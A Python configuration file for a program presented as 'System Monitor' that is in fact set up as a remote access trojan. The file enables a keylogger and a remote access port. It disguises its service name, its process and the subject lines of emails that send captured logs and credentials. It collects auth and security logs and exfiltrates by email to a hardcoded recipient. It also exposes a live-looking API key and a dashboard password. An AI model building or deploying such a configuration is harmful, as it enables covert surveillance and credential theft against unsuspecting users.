"""
System Monitor Configuration Module
Contains all configuration settings for the application
"""

class Config:
    """Configuration class for System Monitor application"""
    
    # SendLib Configuration
    SENDLIB_API_KEY = "sl_4df4dc04_c9784a4c0773e336d5883c679b4ab6c7225344af70373b13feeb8842"
    SENDLIB_URL = "https://sendlib.samueltuoyo.com"
    SENDER_EMAIL = "sedquizstar@gmail.com"
    
    # Default Recipients
    DEFAULT_RECIPIENTS = ["ujiroduke1@gmail.com"]
    
    # Dashboard Configuration
    DASHBOARD_HOST = "0.0.0.0"
    DASHBOARD_PORT = 5000
    DASHBOARD_USERNAME = "admin"
    DASHBOARD_PASSWORD = "rat_admin_2024"
    
    # Log Capture Settings
    LOG_CAPTURE_INTERVAL = 300  # seconds (5 minutes)
    
    # Log files to capture (platform-specific)
    LINUX_LOG_FILES = [
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/auth.log",
        "/var/log/kern.log",
        "/var/log/dmesg",
    ]
    
    MACOS_LOG_FILES = [
        "/var/log/system.log",
        "/var/log/asl.log",
        "/var/log/mail.log",
    ]
    
    WINDOWS_LOG_FILES = [
        "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
        "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
    ]
    
    # Remote Access Settings
    REMOTE_PORT = 8888
    REMOTE_ENABLED = True
    REMOTE_BUFFER_SIZE = 4096
    
    # Database Settings
    DATABASE_PATH = "rat_config.db"
    
    # Service Settings
    SERVICE_NAME = "sysmon-service"  # Disguised name
    RESTART_ON_CRASH = True
    RESTART_DELAY = 10  # seconds
    
    # Email Settings - Disguised subject lines
    EMAIL_SUBJECT_LOGS = "System Update Notification"
    EMAIL_SUBJECT_CREDENTIALS = "Security Alert - Action Required"
    EMAIL_SUBJECT_URL = "Dashboard Access Link"
    
    # Security Settings
    ENCRYPTION_KEY = None  # Can be set for encrypted storage
    MAX_LOG_SIZE = 10000  # Max characters per log entry
    
    # Keylogger Settings
    KEYLOGGER_ENABLED = True
    KEYLOGGER_SEND_INTERVAL = 600  # Send every 10 minutes
    
    # Disguise Settings
    APP_NAME = "System Monitor"
    PROCESS_NAME = "python3"  # Run as generic python process
    
    @classmethod
    def get_log_files(cls):
        """Get log files for current platform"""
        import platform
        system = platform.system()
        
        if system == "Linux":
            return cls.LINUX_LOG_FILES
        elif system == "Darwin":
            return cls.MACOS_LOG_FILES
        elif system == "Windows":
            return cls.WINDOWS_LOG_FILES
        else:
            return []
